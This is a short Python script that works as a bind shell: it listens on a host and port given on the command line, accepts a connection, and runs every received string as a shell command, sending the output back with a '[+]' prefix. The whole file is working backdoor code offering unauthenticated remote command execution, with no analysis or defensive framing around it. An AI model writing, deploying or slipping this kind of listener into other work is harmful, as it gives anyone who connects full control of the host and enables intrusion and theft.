import subprocess
import socket
import sys

print(socket.gethostbyname(socket.gethostname()))
s = socket.socket()
port = int(sys.argv[2])
host = sys.argv[1]

s.bind((host, port))
s.listen()
C_Sock, addr = s.accept()
print("Succes")
while True:
    try:
        data = C_Sock.recv(4096)
        rpcs = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE)
        out = rpcs.stdout.read()
        C_Sock.send(b"[+] " + out)
    except:
        print("Error")
        raise
